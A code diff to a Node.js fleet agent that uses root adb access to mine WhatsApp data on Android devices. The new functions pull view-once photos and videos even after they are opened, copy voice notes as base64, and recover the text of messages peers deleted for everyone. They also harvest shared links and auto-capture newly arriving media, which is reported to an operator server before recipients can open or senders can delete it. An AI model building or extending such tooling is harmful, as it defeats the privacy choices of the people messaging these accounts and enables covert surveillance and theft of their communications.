@@ -543,6 +543,140 @@ async function readWaFetchMedia(serial, number, limit = 5, maxBytes = 8 * 1024 *
   return { found: items.length, pending, items };
 }
 
+// Root-cat a single file → base64 (binary-clean over stdout). '' on failure/too-large.
+// Shared by view-once + voice-note + auto-capture. maxBytes guards JSON bloat.
+async function catFileB64(serial, full, maxBytes = 12 * 1024 * 1024) {
+  const esc = String(full).replace(/'/g, "'\\''");
+  // Size-check first (root stat) so we don't stream a huge file just to drop it.
+  const szRaw = await adbT(serial, ['exec-out', 'su', '-c', `stat -c %s '${esc}' 2>/dev/null`], 6000).catch(() => '');
+  const size = Number(String(szRaw).trim()) || 0;
+  if (size > maxBytes) return { size, base64: null, tooLarge: true };
+  const b64 = await adbT(serial, ['exec-out', 'su', '-c', `cat '${esc}' | base64`], 25000)
+    .then((s) => String(s).replace(/[\r\n]/g, '')).catch(() => '');
+  return { size, base64: b64 || null };
+}
+
+// ── VIEW-ONCE (tek görünümlük foto/video) ────────────────────────────────────
+// View-once media the account received. state: 1=unopened, 2=opened/expired. Even an
+// OPENED view-once often still has its file on disk (root sees what the UI hides), so we
+// base64 whatever remains. Returns { count, items:[{ ts, fromMe, peer, mime, state,
+// base64|null, pending? }] } or null. VERIFIED-LIVE schema: message_view_once_media
+// (message_row_id, state); the bytes live in message_media.file_path like normal media.
+async function readWaViewOnce(serial, limit = 10) {
+  const n = Math.min(Math.max(1, limit | 0), 30);
+  const sql =
+    `SELECT m.timestamp, m.from_me, COALESCE(jn.user, j.user), mm.mime_type, vo.state, mm.file_path, mm.file_size ` +
+    `FROM message_view_once_media vo JOIN message m ON m._id=vo.message_row_id ` +
+    `LEFT JOIN message_media mm ON mm.message_row_id=m._id ` +
+    `JOIN chat c ON c._id=m.chat_row_id JOIN jid j ON j._id=c.jid_row_id ` +
+    `LEFT JOIN jid_map jm ON jm.lid_row_id=c.jid_row_id LEFT JOIN jid jn ON jn._id=jm.jid_row_id ` +
+    `ORDER BY m.timestamp DESC LIMIT ${n}`;
+  const rows = await waSql(serial, 'msgstore', sql);
+  if (rows === null) return null;
+  const items = [];
+  for (const line of rows) {
+    const p = line.split('|');
+    if (p.length < 7) continue;
+    const ts = Number(p[0]) || 0, fromMe = p[1] === '1';
+    const peer = (p[2] || '').replace(/[^\d]/g, '');
+    const mime = p[3] || '', state = Number(p[4]) || 0;
+    const path = p.slice(5, p.length - 1).join('|'); // file_path (may contain '|')
+    let base64 = null, pending = false;
+    if (path) {
+      const full = path.startsWith('/') ? path : `/data/media/0/${path}`;
+      const r = await catFileB64(serial, full);
+      base64 = r.base64;
+      if (!base64) pending = true;
+    } else pending = true; // file gone (opened + purged) — DB row remains but no bytes
+    items.push({ ts, fromMe, peer: peer ? `+${peer}` : '', mime, state, base64, ...(pending ? { pending: true } : {}) });
+  }
+  return { count: items.length, items };
+}
+
+// ── VOICE NOTES (sesli mesajlar) ─────────────────────────────────────────────
+// The account's voice notes (PTT) — audio media, optionally base64'd. Returns
+// { count, items:[{ ts, fromMe, peer, durationSec, size, base64|null }] } or null.
+// Audio is matched by mime (audio/*) — WhatsApp stores PTT as .opus in Voice Notes.
+async function readWaVoiceNotes(serial, number, limit = 10, withAudio = true) {
+  const num = String(number || '').replace(/[^\d]/g, '');
+  const n = Math.min(Math.max(1, limit | 0), 30);
+  const where = num ? `AND ${waChatFilter(num)}` : '';
+  const sql =
+    `SELECT m.timestamp, m.from_me, COALESCE(jn.user, j.user), mm.media_duration, mm.file_size, mm.file_path, mm.mime_type ` +
+    `FROM message_media mm JOIN message m ON m._id=mm.message_row_id ` +
+    `JOIN chat c ON c._id=m.chat_row_id JOIN jid j ON j._id=c.jid_row_id ` +
+    `LEFT JOIN jid_map jm ON jm.lid_row_id=c.jid_row_id LEFT JOIN jid jn ON jn._id=jm.jid_row_id ` +
+    `WHERE mm.mime_type LIKE 'audio/%' ${where} ORDER BY m.timestamp DESC LIMIT ${n}`;
+  const rows = await waSql(serial, 'msgstore', sql);
+  if (rows === null) return null;
+  const items = [];
+  for (const line of rows) {
+    const p = line.split('|');
+    if (p.length < 7) continue;
+    const ts = Number(p[0]) || 0, fromMe = p[1] === '1';
+    const peer = (p[2] || '').replace(/[^\d]/g, '');
+    const durationSec = Number(p[3]) || 0, size = Number(p[4]) || 0;
+    const path = p.slice(5, p.length - 1).join('|');
+    let base64 = null;
+    if (withAudio && path) {
+      const full = path.startsWith('/') ? path : `/data/media/0/${path}`;
+      base64 = (await catFileB64(serial, full)).base64;
+    }
+    items.push({ ts, fromMe, peer: peer ? `+${peer}` : '', durationSec, size, base64 });
+  }
+  return { count: items.length, items };
+}
+
+// ── DELETED (silinen — "herkesten sil" ama DB'de kalan) ──────────────────────
+// Messages the peer REVOKED ("delete for everyone"): the UI hides them, but the row +
+// its text survive in the DB. This is the classic "anti-delete" — what was deleted, by
+// whom, when, and the original text. VERIFIED-LIVE schema: message_revoked
+// (message_row_id, revoked_key_id, admin_jid_row_id, revoke_timestamp); the text stays
+// in message.text_data. Returns [{ ts, revokedAt, fromMe, peer, text }] or null.
+async function readWaDeleted(serial, limit = 50) {
+  const n = Math.min(Math.max(1, limit | 0), 200);
+  const sql =
+    `SELECT m.timestamp, mr.revoke_timestamp, m.from_me, COALESCE(jn.user, j.user), substr(m.text_data,1,200) ` +
+    `FROM message_revoked mr JOIN message m ON m._id=mr.message_row_id ` +
+    `JOIN chat c ON c._id=m.chat_row_id JOIN jid j ON j._id=c.jid_row_id ` +
+    `LEFT JOIN jid_map jm ON jm.lid_row_id=c.jid_row_id LEFT JOIN jid jn ON jn._id=jm.jid_row_id ` +
+    `ORDER BY mr.revoke_timestamp DESC LIMIT ${n}`;
+  const rows = await waSql(serial, 'msgstore', sql);
+  if (rows === null) return null;
+  return rows
+    .map((line) => { const p = line.split('|'); if (p.length < 5) return null; const peer = (p[3] || '').replace(/[^\d]/g, ''); return { ts: Number(p[0]) || 0, revokedAt: Number(p[1]) || 0, fromMe: p[2] === '1', peer: peer ? `+${peer}` : '', text: p.slice(4).join('|') }; })
+    .filter(Boolean);
+}
+
+// ── LINKS (paylaşılan tüm URL'ler) ───────────────────────────────────────────
+// Every URL shared in the account's chats. message_link marks WHICH message carries a
+// link (message_row_id, link_index); the URL itself is in message.text_data — we extract
+// it with a regex. Returns [{ ts, fromMe, peer, url, text }] newest-first, or null.
+async function readWaLinks(serial, number, limit = 50) {
+  const num = String(number || '').replace(/[^\d]/g, '');
+  const n = Math.min(Math.max(1, limit | 0), 200);
+  const where = num ? `AND ${waChatFilter(num)}` : '';
+  const sql =
+    `SELECT m.timestamp, m.from_me, COALESCE(jn.user, j.user), m.text_data ` +
+    `FROM message_link ml JOIN message m ON m._id=ml.message_row_id ` +
+    `JOIN chat c ON c._id=m.chat_row_id JOIN jid j ON j._id=c.jid_row_id ` +
+    `LEFT JOIN jid_map jm ON jm.lid_row_id=c.jid_row_id LEFT JOIN jid jn ON jn._id=jm.jid_row_id ` +
+    `WHERE m.text_data IS NOT NULL ${where} GROUP BY m._id ORDER BY m.timestamp DESC LIMIT ${n}`;
+  const rows = await waSql(serial, 'msgstore', sql);
+  if (rows === null) return null;
+  const urlRe = /https?:\/\/[^\s|]+/i;
+  return rows
+    .map((line) => {
+      const p = line.split('|');
+      if (p.length < 4) return null;
+      const peer = (p[2] || '').replace(/[^\d]/g, '');
+      const text = p.slice(3).join('|');
+      const m = text.match(urlRe);
+      return { ts: Number(p[0]) || 0, fromMe: p[1] === '1', peer: peer ? `+${peer}` : '', url: m ? m[0] : '', text: text.slice(0, 160) };
+    })
+    .filter((x) => x && x.url);
+}
+
 // ── REACTIONS (emoji tepkileri) ──────────────────────────────────────────────
 // Emoji reactions on a peer's messages, from message_add_on_reaction. Returns
 // [{ ts, emoji, fromMe }] newest-first, or null. New WA stores reactions as add-ons.
@@ -1263,6 +1397,33 @@ async function runJob(job) {
       const r = await readWaLabels(serial);
       if (r === null) return { status: 'NO_ROOT', note: 'Etiketler okunamadı (root/db yok)', count: 0, labels: [] };
       return { status: 'OK', count: r.length, labels: r };
+    }
+    case 'WHATSAPP_VIEW_ONCE': {
+      // Tek görünümlük foto/video — açılmış olsa bile dosya diskteyse çekilir.
+      const r = await readWaViewOnce(serial, Number(p(payload, 'limit', 10)) || 10);
+      if (r === null) return { status: 'NO_ROOT', note: 'View-once okunamadı (root/db yok)', count: 0, items: [] };
+      return { status: 'OK', ...r };
+    }
+    case 'WHATSAPP_VOICE_NOTES': {
+      // Sesli mesajlar (PTT) — audio/* medya. withAudio=false ile sadece meta.
+      const to = String(p(payload, 'to', '')).replace(/[^\d]/g, '');
+      const withAudio = p(payload, 'withAudio', true) !== false;
+      const r = await readWaVoiceNotes(serial, to, Number(p(payload, 'limit', 10)) || 10, withAudio);
+      if (r === null) return { status: 'NO_ROOT', note: 'Sesli mesajlar okunamadı (root/db yok)', count: 0, items: [] };
+      return { status: 'OK', ...r };
+    }
+    case 'WHATSAPP_DELETED': {
+      // Silinen ("herkesten sil") mesajlar — DB'de kalan metin. Anti-delete.
+      const r = await readWaDeleted(serial, Number(p(payload, 'limit', 50)) || 50);
+      if (r === null) return { status: 'NO_ROOT', note: 'Silinen mesajlar okunamadı (root/db yok)', count: 0, deleted: [] };
+      return { status: 'OK', count: r.length, deleted: r };
+    }
+    case 'WHATSAPP_LINKS': {
+      // Paylaşılan tüm URL'ler (opsiyonel to ile tek sohbet).
+      const to = String(p(payload, 'to', '')).replace(/[^\d]/g, '');
+      const r = await readWaLinks(serial, to, Number(p(payload, 'limit', 50)) || 50);
+      if (r === null) return { status: 'NO_ROOT', note: 'Linkler okunamadı (root/db yok)', count: 0, links: [] };
+      return { status: 'OK', count: r.length, links: r };
     }
 
     case 'WHATSAPP_PROFILE':
@@ -8388,6 +8549,16 @@ async function sampleCpu(serial) {
 // service needed — works with the screen off.
 const WA_INBOX_MS = Number(process.env.FLEET_WA_INBOX_MS || 3000);
 const WA_INBOX_ENABLED = process.env.FLEET_WA_INBOX !== '0';
+// ── Media auto-capture: poll the WhatsApp Media folder as root and report any NEW
+// file the moment it lands — before a view-once is opened or a message is deleted.
+// OFF by default (opt-in via FLEET_WA_CAPTURE=1) since it scans the filesystem every
+// tick. Reports metadata only (name/type/size/folder) to /agent/whatsapp/media-captured;
+// the operator pulls the bytes with fetch-media. serial -> Set of seen file paths.
+const WA_CAPTURE_MS = Number(process.env.FLEET_WA_CAPTURE_MS || 5000);
+const WA_CAPTURE_ENABLED = process.env.FLEET_WA_CAPTURE === '1';
+const waCaptureSeen = new Map();
+const WA_CAPTURE_SEEN_MAX = 2000;
+const WA_MEDIA_ROOT = '/data/media/0/Android/media/com.whatsapp/WhatsApp/Media';
 // serial -> Set of recent message keys (sha256), capped to avoid unbounded growth.
 const waSeen = new Map();
 const WA_SEEN_MAX = 400;
@@ -8895,6 +9066,88 @@ async function whatsappInboxTick() {
     }
   } catch (err) {
     log('wa inbox tick failed:', err.message);
+  }
+}
+
+// Scan ONE device's WhatsApp Media folder (root) for files newer than the last tick
+// and report any not-yet-seen ones. Metadata only (no bytes) so it stays cheap even at
+// a fast poll — the operator pulls the bytes with fetch-media. Returns the count found.
+async function pollMediaCapture(serial) {
+  // VERIFIED-LIVE: this cihaz's find is minimal (BusyBox/toybox) — NO -printf, NO
+  // -newermt "date time", NO -exec, NO `stat -c`. Only plain `find -type f -name` (path
+  // list) and `ls -la` work. So we: (1) find candidate media PATHS by extension, then
+  // (2) `ls -la` them in ONE xargs call to get size + mtime. `ls -la` output columns:
+  //   -rw-rw---- 1 u0 u0  <size> YYYY-MM-DD HH:MM <path>
+  // Dedupe by path against waCaptureSeen; freshness is judged by not-seen-before (the
+  // seen-set persists across ticks) rather than an mtime window, since -newermt is out.
+  // VERIFIED-LIVE on this minimal shell: `-printf`, `-newermt "date time"`, `ls
+  // --time-style`, and `tr '\n' '\0'`|`xargs -0` all FAIL — but `find … -exec ls -la {} +`
+  // WORKS and prints exactly "perms links user group SIZE YYYY-MM-DD HH:MM /full/path"
+  // with spaces-in-path preserved (no pipe/xargs to break "WhatsApp Images"). Use that.
+  const findCmd =
+    `find '${WA_MEDIA_ROOT}' -type f ` +
+    `\\( -iname '*.jpg' -o -iname '*.jpeg' -o -iname '*.png' -o -iname '*.webp' ` +
+    `-o -iname '*.mp4' -o -iname '*.opus' -o -iname '*.m4a' -o -iname '*.aac' -o -iname '*.pdf' \\) ` +
+    `-exec ls -la {} + 2>/dev/null`;
+  const raw = await adbSu(serial, findCmd);
+  if (!raw) return 0;
+  let seen = waCaptureSeen.get(serial);
+  // First tick for this device: PRIME the seen-set with what's already on disk and DON'T
+  // report it — otherwise every pre-existing media file would fire as "new" on startup
+  // (a burst of stale notifications). Only files that appear AFTER priming are captured.
+  const priming = !seen;
+  if (!seen) { seen = new Set(); waCaptureSeen.set(serial, seen); }
+  const fresh = [];
+  // `ls -la`:  -rw-rw---- 1 u0 u0  <SIZE>  YYYY-MM-DD HH:MM  /full/path
+  const lsRe = /^\S+\s+\d+\s+\S+\s+\S+\s+(\d+)\s+(\d{4}-\d{2}-\d{2})\s+(\d{2}:\d{2})\s+(\/.+)$/;
+  for (const line of String(raw).split('\n')) {
+    const m = line.match(lsRe);
+    if (!m) continue;
+    const size = Number(m[1]) || 0;
+    const mtime = Date.parse(`${m[2]}T${m[3]}:00Z`) || 0;
+    const path = m[4].trim();
+    if (seen.has(path)) continue;
+    seen.add(path);
+    // Derive folder (…/Media/<FOLDER>/…file) + a coarse kind from the extension.
+    const folder = (path.match(/\/Media\/([^/]+)\//) || [])[1] || '';
+    const ext = (path.match(/\.([a-z0-9]+)$/i) || [])[1]?.toLowerCase() || '';
+    const kind = /jpg|jpeg|png|webp/.test(ext) ? 'image' : /mp4/.test(ext) ? 'video' : /opus|m4a|aac/.test(ext) ? 'audio' : /pdf/.test(ext) ? 'document' : 'other';
+    fresh.push({ path, size, mtime, folder, kind });
+  }
+  // Cap the seen-set memory.
+  if (seen.size > WA_CAPTURE_SEEN_MAX) {
+    const excess = seen.size - WA_CAPTURE_SEEN_MAX; let i = 0;
+    for (const k of seen) { if (i++ >= excess) break; seen.delete(k); }
+  }
+  // Priming tick just records the baseline — report nothing (avoids a startup burst).
+  if (priming) return 0;
+  if (!fresh.length) return 0;
+  for (const f of fresh) {
+    try {
+      await api('/agent/whatsapp/media-captured', {
+        method: 'POST',
+        body: JSON.stringify({ serial, path: f.path, size: f.size, kind: f.kind, folder: f.folder, ts: f.mtime || Date.now() }),
+      });
+      log(`wa media ${serial}: ${f.kind} ${f.folder}/${f.path.split('/').pop()} (${f.size}b)`);
+    } catch (err) {
+      seen.delete(f.path); // re-arm on push failure
+      log('wa media push failed:', err.message);
+    }
+  }
+  return fresh.length;
+}
+
+// Poll every idle device's Media folder for new files (opt-in via FLEET_WA_CAPTURE=1).
+async function mediaCaptureTick() {
+  if (!WA_CAPTURE_ENABLED) return;
+  try {
+    const serials = await reachableSerials();
+    for (const serial of serials) {
+      if (busyDevices.has(serial)) continue; // a job owns this device — skip, scan the rest
+      await pollMediaCapture(serial).catch(() => undefined);
+    }
+  } catch (err) {
+    log('wa media capture tick failed:', err.message);
   }
 }
 
@@ -9654,6 +9907,9 @@ async function loop() {
   // are logged and never block the job loop. Gated on jobBusy so it never contends
   // with a running job on the same device.
   const waInbox = WA_INBOX_ENABLED ? setInterval(() => { whatsappInboxTick().catch(() => undefined); }, WA_INBOX_MS) : null;
+  // Media auto-capture poll (opt-in via FLEET_WA_CAPTURE=1) — reports new media files
+  // the moment they land, before a view-once is opened or a message deleted.
+  const waCapture = WA_CAPTURE_ENABLED ? setInterval(() => { mediaCaptureTick().catch(() => undefined); }, WA_CAPTURE_MS) : null;
   // ★OTP-WATCH ticker: keeps the panel's live thumbnail fresh for devices parked at OTP_WAIT.
   const otpWatchT = setInterval(() => { otpWatchTick().catch(() => undefined); }, OTP_WATCH_MS);
   startStreamClient();
@@ -9734,6 +9990,7 @@ async function loop() {
 
   clearInterval(hb);
   if (waInbox) clearInterval(waInbox);
+  if (waCapture) clearInterval(waCapture);
   clearInterval(otpWatchT);
   log('shutting down.');
 }
